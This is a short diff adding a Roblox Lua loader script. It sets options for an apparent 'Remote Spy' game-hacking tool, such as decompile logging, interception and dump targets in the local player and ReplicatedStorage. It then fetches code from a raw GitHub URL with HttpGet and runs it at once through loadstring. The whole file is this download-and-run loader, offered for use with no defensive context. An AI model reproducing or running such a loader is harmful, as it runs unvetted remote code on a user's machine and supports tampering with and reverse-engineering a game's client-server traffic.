@@ -1,0 +1,12 @@
+local settings = {
+    SaveDecompileLogs = true,
+    SaveScanLogs = true,
+    ScanForNewInstance = true,
+    InterceptUntilRan = true,
+    CursorOffset = -15,
+    PathToDump = {game.Players.LocalPlayer, game:GetService('ReplicatedStorage')}
+
+}
+
+_G.data = settings
+loadstring(game:HttpGet('https://raw.githubusercontent.com/perfectusmim1/Remote-Spy/refs/heads/main/remotespy'))()
